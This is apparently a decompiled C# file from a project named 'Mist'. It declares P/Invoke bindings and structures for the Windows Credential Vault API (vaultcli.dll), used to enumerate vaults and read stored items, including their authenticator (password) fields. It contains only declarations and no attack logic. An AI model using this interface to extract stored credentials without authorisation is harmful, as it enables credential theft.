using System;
using System.Runtime.InteropServices;

namespace Mist
{
	// Token: 0x0200002A RID: 42
	internal class VaultCli
	{
		// Token: 0x060000D0 RID: 208
		[DllImport("vaultcli.dll")]
		public static extern int VaultOpenVault(ref Guid vaultGuid, uint offset, ref IntPtr vaultHandle);

		// Token: 0x060000D1 RID: 209
		[DllImport("vaultcli.dll")]
		public static extern int VaultCloseVault(ref IntPtr vaultHandle);

		// Token: 0x060000D2 RID: 210
		[DllImport("vaultcli.dll")]
		public static extern int VaultFree(ref IntPtr vaultHandle);

		// Token: 0x060000D3 RID: 211
		[DllImport("vaultcli.dll")]
		public static extern int VaultEnumerateVaults(int offset, ref int vaultCount, ref IntPtr vaultGuid);

		// Token: 0x060000D4 RID: 212
		[DllImport("vaultcli.dll")]
		public static extern int VaultEnumerateItems(IntPtr vaultHandle, int chunkSize, ref int vaultItemCount, ref IntPtr vaultItem);

		// Token: 0x060000D5 RID: 213
		[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
		public static extern int VaultGetItem_WIN8(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr pPackageSid, IntPtr zero, int arg6, ref IntPtr passwordVaultPtr);

		// Token: 0x060000D6 RID: 214
		[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
		public static extern int VaultGetItem_WIN7(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr zero, int arg5, ref IntPtr passwordVaultPtr);

		// Token: 0x0200002B RID: 43
		public enum VAULT_ELEMENT_TYPE
		{
			// Token: 0x04000083 RID: 131
			Undefined = -1,
			// Token: 0x04000084 RID: 132
			Boolean,
			// Token: 0x04000085 RID: 133
			Short,
			// Token: 0x04000086 RID: 134
			UnsignedShort,
			// Token: 0x04000087 RID: 135
			Int,
			// Token: 0x04000088 RID: 136
			UnsignedInt,
			// Token: 0x04000089 RID: 137
			Double,
			// Token: 0x0400008A RID: 138
			Guid,
			// Token: 0x0400008B RID: 139
			String,
			// Token: 0x0400008C RID: 140
			ByteArray,
			// Token: 0x0400008D RID: 141
			TimeStamp,
			// Token: 0x0400008E RID: 142
			ProtectedArray,
			// Token: 0x0400008F RID: 143
			Attribute,
			// Token: 0x04000090 RID: 144
			Sid,
			// Token: 0x04000091 RID: 145
			Last
		}

		// Token: 0x0200002C RID: 44
		public enum VAULT_SCHEMA_ELEMENT_ID
		{
			// Token: 0x04000093 RID: 147
			Illegal,
			// Token: 0x04000094 RID: 148
			Resource,
			// Token: 0x04000095 RID: 149
			Identity,
			// Token: 0x04000096 RID: 150
			Authenticator,
			// Token: 0x04000097 RID: 151
			Tag,
			// Token: 0x04000098 RID: 152
			PackageSid,
			// Token: 0x04000099 RID: 153
			AppStart = 100,
			// Token: 0x0400009A RID: 154
			AppEnd = 10000
		}

		// Token: 0x0200002D RID: 45
		public struct VAULT_ITEM_WIN8
		{
			// Token: 0x0400009B RID: 155
			public Guid SchemaId;

			// Token: 0x0400009C RID: 156
			public IntPtr pszCredentialFriendlyName;

			// Token: 0x0400009D RID: 157
			public IntPtr pResourceElement;

			// Token: 0x0400009E RID: 158
			public IntPtr pIdentityElement;

			// Token: 0x0400009F RID: 159
			public IntPtr pAuthenticatorElement;

			// Token: 0x040000A0 RID: 160
			public IntPtr pPackageSid;

			// Token: 0x040000A1 RID: 161
			public ulong LastModified;

			// Token: 0x040000A2 RID: 162
			public uint dwFlags;

			// Token: 0x040000A3 RID: 163
			public uint dwPropertiesCount;

			// Token: 0x040000A4 RID: 164
			public IntPtr pPropertyElements;
		}

		// Token: 0x0200002E RID: 46
		public struct VAULT_ITEM_WIN7
		{
			// Token: 0x040000A5 RID: 165
			public Guid SchemaId;

			// Token: 0x040000A6 RID: 166
			public IntPtr pszCredentialFriendlyName;

			// Token: 0x040000A7 RID: 167
			public IntPtr pResourceElement;

			// Token: 0x040000A8 RID: 168
			public IntPtr pIdentityElement;

			// Token: 0x040000A9 RID: 169
			public IntPtr pAuthenticatorElement;

			// Token: 0x040000AA RID: 170
			public ulong LastModified;

			// Token: 0x040000AB RID: 171
			public uint dwFlags;

			// Token: 0x040000AC RID: 172
			public uint dwPropertiesCount;

			// Token: 0x040000AD RID: 173
			public IntPtr pPropertyElements;
		}

		// Token: 0x0200002F RID: 47
		[StructLayout(LayoutKind.Explicit)]
		public struct VAULT_ITEM_ELEMENT
		{
			// Token: 0x040000AE RID: 174
			[FieldOffset(0)]
			public VaultCli.VAULT_SCHEMA_ELEMENT_ID SchemaElementId;

			// Token: 0x040000AF RID: 175
			[FieldOffset(8)]
			public VaultCli.VAULT_ELEMENT_TYPE Type;
		}
	}
}
